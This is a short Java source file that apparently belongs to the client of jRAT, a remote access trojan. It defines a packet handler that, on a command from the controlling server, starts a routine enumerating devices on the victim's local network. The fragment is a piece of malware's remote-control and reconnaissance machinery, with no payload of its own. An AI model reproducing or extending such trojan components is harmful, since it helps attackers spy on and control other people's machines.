package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.Netview;

public class Packet71LocalNetworkDevices implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		new Netview(con).start();
	}

}
